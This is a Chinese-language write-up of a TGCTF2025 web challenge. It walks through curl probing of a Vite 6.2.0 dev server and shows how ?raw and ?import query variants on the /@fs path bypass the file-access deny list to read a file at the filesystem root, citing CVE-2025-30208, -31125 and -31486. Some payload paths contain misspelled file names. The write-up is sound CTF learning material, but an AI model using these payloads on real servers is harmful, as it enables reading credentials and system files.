TGCTF2025前端游戏任意文件读取漏洞
1.信息探测
	网页进入后是一个游戏页面，你玩超过16分后，会发现它提示flag在根目录/tgflagggg下，
	我们可以先用来探测题目
		`curl -s -i http://.../ --max-time 10`
	可以看到他是Vitetvue3游戏，暴露源码/main.js,可看游戏逻辑:
	`curl -s http://.../src/main.js --max-time 10`可以发现好多隐藏路径
		/src/App.vue,/src/router/index.js
		/src/style/index.scss,/src/permission.ts
		`curl -s http://  /src/router/index.ts`发现它指了二个路径:
			/src/views/stage/pc.vue
			/src/views/stage/mobile.vue
		后面继续访问/src/App.vue -->发现/@vite/client
			/src/views/stage/pc.vue -->发现import Stage from /src/utils/stage.ts -->游戏核心逻辑
2.源码审计
	探测/src/utils/stage.ts `#`消消乐逻辑
	发现游戏逻辑全在客户端(score?17只是弹窗提示)，打游戏拿不到flag
3.探测flag路径
	`curl -s -i http://.../tgflagggg/`
	`curl -s -i http://.../tgflagggg`
	两次都返回405字节的index.html(SPA fallback),说明文件不在Vite项目根(/app),而是文件系统真正的根目录/tgflagggg正常HTTP访问不到
4.指纹确认漏洞面
	`curl -s http://127.0.0.1:15490/package.json`拿到依赖版本，这个是根据经验
	`curl -s http://  /@vite/client`确认Vite加载路径
	以上显示vite:6.2.0版面，此版本在2025年公开的三个fs绕过任意文件读取漏洞:CVE-2025-30208(?raw??)、CVE-2025-31125(?raw&import)、CVE-2025-31486(?import&raw).   ?raw本意是把文件以纯文本导入，但vite的server.fs.deny保护(禁止读取/app之外的文件),可被这些query变体绕过
5.漏洞利用
	`#`先验证/@fs前缀是否可映射到文件系统根
		`curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://.../@fs/tgflagggg"`
		`curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://.../@fs//tgflagggg"`
	原因:Vite的/@fs/<绝对路径>可将URL映射到服务器文件系统任意绝对路径，先裸测确认响应(403=被allow list拦截，方向正确)
		`for u in "/@fs/tsflagggg?raw&import" "/@fs/tgflagggg?import&raw" "/@fs/tgflagggg?raw??" "/@fs/tgflagggg?raw" "/@fs//tsflaggggg?raw&import"; do`
			`curl -s -w "\n[%{http_code}]\n" "http://...$u" --max-time 10`
		`done`
		得到flag
